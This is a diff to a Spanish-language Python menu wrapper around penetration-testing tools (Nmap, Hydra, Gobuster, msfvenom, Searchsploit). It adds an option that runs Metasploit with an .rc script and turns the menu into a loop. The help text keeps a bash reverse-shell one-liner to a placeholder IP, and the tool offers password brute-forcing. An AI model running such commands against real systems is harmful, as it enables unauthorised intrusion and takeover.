@@ -389,6 +389,13 @@ Opciones rápidas con Netcat:
 5. Shell reversa (Linux): bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1
 Puedes ejecutar estos comandos manualmente en otra terminal.
 """)
+def ejecutar_msfconsole(script_rc):
+    comando = ["msfconsole", "-r", script_rc]
+    print(f"\nEjecutando: {' '.join(comando)}")
+    try:
+        subprocess.run(comando, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error al ejecutar Metasploit: {e}")
 def mostrar_ayuda():
     print(""")
 Opciones de escaneo con Nmap y herramientas relacionadas:
@@ -421,6 +428,7 @@ Opciones de escaneo con Nmap y herramientas relacionadas:
 27. Fuzzing de directorios y archivos web con FFUF
 28. Busqueda de exploits locales con Searchsploit
 29. Comandos útiles de Netcat
+30. Ejecutar Metasploit con script .rc automatizado
 h. Mostrar esta ayuda
 """)
 if __name__ == "__main__":
@@ -430,142 +438,115 @@ if __name__ == "__main__":
         print("Objetivo inválido. Introduce una IP, dominio o IPv6 válido.")
         exit(1)
 
-    mostrar_ayuda()
-    opcion = input("Elige una opción (1-19, h para ayuda): ")
-    extra = input("¿Quieres añadir parámetros extra a Nmap? (deja vacío si no): ")
-    if extra.lower() in ["si", "no"]:
-        extra = ""
+    while True:
+        mostrar_ayuda()
+        opcion = input("Elige una opción (1-30, h para ayuda, q para salir): ")
+        if opcion.lower() == "q":
+            print("Saliendo...")
+            break
+        extra = input("¿Quieres añadir parámetros extra a Nmap? (deja vacío si no): ")
+        if extra.lower() in ["si", "no"]:
+            extra = ""
 
-if opcion == "1":
-    # ...tu lógica...
-    escaneo_basico(objetivo, min_rate, extra, puertos, formato)
-    if formato == "txt":
-        mostrar_resumen_servicios("nmap_result.txt")
-elif opcion == "2":
-    escaneo_servicios(objetivo, extra, formato)
-    if formato == "txt":
-        mostrar_resumen_servicios("nmap_servicios.txt")
-elif opcion == "3":
-    escaneo_os(objetivo, extra, formato)
-    if formato == "txt":
-        mostrar_resumen_servicios("nmap_os.txt")
-# ...y así sucesivamente para las demás funciones de Nmap...
-elif opcion == "4":
-    escaneo_xml(objetivo, extra)
-elif opcion == "5":
-    escaneo_json(objetivo, extra)
-elif opcion == "6":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_servicios_C(objetivo, extra, formato)
-elif opcion == "7":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_agresivo(objetivo, extra, formato)
-elif opcion == "8":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_syn(objetivo, extra, formato)
-elif opcion == "9":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    for nivel in range(1, 5):
-        escaneo_sigiloso(objetivo, nivel, extra, formato)
-elif opcion == "10":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_ipv6(objetivo, extra, formato)
-elif opcion == "11":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_nse_vuln(objetivo, extra, formato)
-elif opcion == "12":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_arp(objetivo, extra, formato)
-elif opcion == "13":
-    ayuda_android()
-elif opcion == "14":
-    escaneo_nmap_msf(objetivo, extra)
-elif opcion == "15":
-    escaneo_dirsearch(objetivo, extra)
-elif opcion == "16":
-    servicio = input("Servicio a atacar (ejemplo: ftp, ssh, mysql, http, smb, rdp, telnet, vnc, etc.): ")
-    usuario = input("Usuario objetivo: ")
-    diccionario = input("Ruta al diccionario de contraseñas: ")
-    hilos = input("Número de hilos (ejemplo: 4, 8, 16): ")
-    if not hilos.isdigit() or int(hilos) < 1:
-        hilos = "4"
-    escaneo_hydra(objetivo, servicio, usuario, diccionario, hilos)
-elif opcion == "17":
-    wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ")
-    ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
-    threads = input("Número de hilos (ejemplo: 10, 20): ")
-    if not threads.isdigit() or int(threads) < 1:
-        threads = "10"
-    escaneo_gobuster(objetivo, wordlist, ext, threads)
-elif opcion == "18":
-    escaneo_nessus(objetivo)
-elif opcion == "19":
-    generar_payload_msfvenom()
-
-elif opcion == "20":
-    script_nse = input("Nombre del script NSE a ejecutar (ejemplo: http-enum, ftp-anon, smb-os-discovery): ")
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_nse_personalizado(objetivo, script_nse, extra, formato)
-
-elif opcion == "21":
-    formato = input("Formato de salida (txt, xml, json) [por defecto txt]: ").lower()
-    if formato not in ["txt", "xml", "json"]:
-        formato = "txt"
-    escaneo_udp(objetivo, extra, formato)
-    if formato == "txt":
-        mostrar_resumen_servicios("nmap_udp.txt")
-elif opcion.lower() == "h":
-    mostrar_ayuda()
-elif opcion == "22":
-    escaneo_nikto(objetivo, extra)
-elif opcion == "23":
-    escaneo_whatweb(objetivo, extra)
-elif opcion == "24":
-    escaneo_enum4linux(objetivo, extra)
-elif opcion == "25":
-    escaneo_openvas(objetivo, extra)
-elif opcion == "26":
-    wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
-    url_fuzz = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
-    if not os.path.isfile(wordlist):
-        print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
-    elif not validar_url_fuzz(url_fuzz):
-        print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
-    else:
-        escaneo_wfuzz(url_fuzz, wordlist, extra)
-
-elif opcion == "27":
-    wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
-    url_ffuf = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
-    ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
-    if not os.path.isfile(wordlist):
-        print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
-    elif not validar_url_fuzz(url_ffuf):
-        print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
-    else:
-        escaneo_ffuf(url_ffuf, wordlist, ext, extra)
-
-elif opcion == "28":
-    servicio = input("Servicio, versión o palabra clave a buscar en Searchsploit: ")
-    escaneo_searchsploit(servicio)
-
-elif opcion == "29":
-    escaneo_netcat()
-else:
-    print("Opción no válida.")   
+        # Aquí van todos tus bloques de opciones (if/elif)
+        if opcion == "1":
+            escaneo_basico(objetivo, min_rate=1000, extra=extra, puertos="", formato="txt")
+            mostrar_resumen_servicios("nmap_result.txt")
+        elif opcion == "2":
+            escaneo_servicios(objetivo, extra, "txt")
+            mostrar_resumen_servicios("nmap_servicios.txt")
+        elif opcion == "3":
+            escaneo_os(objetivo, extra, "txt")
+            mostrar_resumen_servicios("nmap_os.txt")
+        elif opcion == "4":
+            escaneo_basico(objetivo, min_rate=1000, extra=extra, puertos="", formato="xml")
+        elif opcion == "5":
+            escaneo_basico(objetivo, min_rate=1000, extra=extra, puertos="", formato="json")
+        elif opcion == "6":
+            escaneo_servicios_C(objetivo, extra, "txt")
+        elif opcion == "7":
+            escaneo_agresivo(objetivo, extra, "txt")
+        elif opcion == "8":
+            escaneo_syn(objetivo, extra, "txt")
+        elif opcion == "9":
+            for nivel in range(1, 5):
+                escaneo_sigiloso(objetivo, nivel, extra, "txt")
+        elif opcion == "10":
+            escaneo_ipv6(objetivo, extra, "txt")
+        elif opcion == "11":
+            escaneo_nse_vuln(objetivo, extra, "txt")
+        elif opcion == "12":
+            escaneo_arp(objetivo, extra, "txt")
+        elif opcion == "13":
+            ayuda_android()
+        elif opcion == "14":
+            escaneo_nmap_msf(objetivo, extra)
+        elif opcion == "15":
+            escaneo_dirsearch(objetivo, extra)
+        elif opcion == "16":
+            servicio = input("Servicio a atacar (ejemplo: ftp, ssh, mysql, http, smb, rdp, telnet, vnc, etc.): ")
+            usuario = input("Usuario objetivo: ")
+            diccionario = input("Ruta al diccionario de contraseñas: ")
+            hilos = input("Número de hilos (ejemplo: 4, 8, 16): ")
+            if not hilos.isdigit() or int(hilos) < 1:
+                hilos = "4"
+            escaneo_hydra(objetivo, servicio, usuario, diccionario, hilos)
+        elif opcion == "17":
+            wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ")
+            ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
+            threads = input("Número de hilos (ejemplo: 10, 20): ")
+            if not threads.isdigit() or int(threads) < 1:
+                threads = "10"
+            escaneo_gobuster(objetivo, wordlist, ext, threads)
+        elif opcion == "18":
+            escaneo_nessus(objetivo)
+        elif opcion == "19":
+            generar_payload_msfvenom()
+        elif opcion == "20":
+            script_nse = input("Nombre del script NSE a ejecutar (ejemplo: http-enum, ftp-anon, smb-os-discovery): ")
+            escaneo_nse_personalizado(objetivo, script_nse, extra, "txt")
+        elif opcion == "21":
+            escaneo_udp(objetivo, extra, "txt")
+            mostrar_resumen_servicios("nmap_udp.txt")
+        elif opcion.lower() == "h":
+            mostrar_ayuda()
+        elif opcion == "22":
+            escaneo_nikto(objetivo, extra)
+        elif opcion == "23":
+            escaneo_whatweb(objetivo, extra)
+        elif opcion == "24":
+            escaneo_enum4linux(objetivo, extra)
+        elif opcion == "25":
+            escaneo_openvas(objetivo, extra)
+        elif opcion == "26":
+            wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
+            url_fuzz = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
+            if not os.path.isfile(wordlist):
+                print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
+            elif not validar_url_fuzz(url_fuzz):
+                print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
+            else:
+                escaneo_wfuzz(url_fuzz, wordlist, extra)
+        elif opcion == "27":
+            wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
+            url_ffuf = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
+            ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
+            if not os.path.isfile(wordlist):
+                print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
+            elif not validar_url_fuzz(url_ffuf):
+                print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
+            else:
+                escaneo_ffuf(url_ffuf, wordlist, ext, extra)
+        elif opcion == "28":
+            servicio = input("Servicio, versión o palabra clave a buscar en Searchsploit: ")
+            escaneo_searchsploit(servicio)
+        elif opcion == "29":
+            escaneo_netcat()
+        elif opcion == "30":
+            script_rc = input("Ruta al archivo de comandos .rc para Metasploit: ").strip()
+            if not os.path.isfile(script_rc):
+                print(f"El archivo '{script_rc}' no existe. Verifica la ruta.")
+            else:
+                ejecutar_msfconsole(script_rc)
+        else:
+            print("Opción no válida.")
